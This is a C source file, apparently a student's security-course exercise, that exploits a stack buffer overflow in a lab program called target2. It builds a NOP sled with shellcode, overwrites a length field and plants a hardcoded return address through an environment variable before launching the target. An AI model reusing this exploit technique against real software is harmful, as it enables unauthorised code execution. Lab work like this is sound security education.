// | Author |    utid 	|   student id	|
// | Ke Li	|   like23 	|	1005842554	|
// |		|			|				|
// Reference:
// Smashing The Stack For Fun And Profit - Aleph One
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"
#define TARGET "../targets/target2"

#define DEFAULT_BUFFER_SIZE 267
#define BUF_ADDR 104
#define NOP_LEN 200

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

	// buf[256] addr: $1 = (char (*)[256]) 0x3021fd80
	unsigned long buf_addr = 0x3021fd80;

	char buff[DEFAULT_BUFFER_SIZE];
	char env_buf[17];
	int i; 

	// buff: NOP sled + shellcode + len
	// =======================================
	// NOP sled
	for (i = 0; i < 264; i++) 
        buff[i] = '\x90';

	// shellcode
	int iter_shell;
	iter_shell = 0;
	for (i = NOP_LEN; i < (NOP_LEN + strlen(shellcode)); i++){
		buff[i] = shellcode[iter_shell]; 
		iter_shell++;
	}

	// len
	// int len addr: $1 = (int *) 0x3021fe88 (264 greater than buf addr)
	// 264 - 267 --> 0x00000110
	// ======================================
	buff[264] = '\x1c';
	buff[265] = '\x01';
	buff[266] = '\x00';
	// end of the buf
	// ======================================


	// print for debug
	// =======================================
	// int length = strlen(buff); 
	// printf("buff length = %d\n", length);
    // for (int j = 0; j < length; j++) {
    //     printf("\\x%02x", (unsigned char)buff[j]);
    // }
    // printf("\n");
	// =======================================

	
	// env variable (second part overflow)
	// =======================================
	// "\x0f\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x80\xfd\x21\x30\x00"
	// "\x80\xfd\x21\30"
	// \x0f for i
	// buf[256] addr: $1 = (char (*)[256]) 0x3021fd80
	env_buf[0] = '\x0f';
	for(i = 1; i < 12; i++){
		env_buf[i] = '\x90';
	}
	// change the $rip (4byte)
	// starting at buff[280]
	i = 12;
	env_buf[0 + i] = buf_addr & 0xFF;              	// Byte 0
	env_buf[1 + i] = (buf_addr >> 8) & 0xFF;   		// Byte 1
	env_buf[2 + i] = (buf_addr >> 16) & 0xFF;  		// Byte 2
	env_buf[3 + i] = (buf_addr >> 24) & 0xFF;  		// Byte 3
	env_buf[16] = '\x00';
	// =======================================

	
	args[0] = TARGET;
	args[1] = buff;
	args[2] = NULL;

	env[0] = "";
	env[1] = env_buf;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
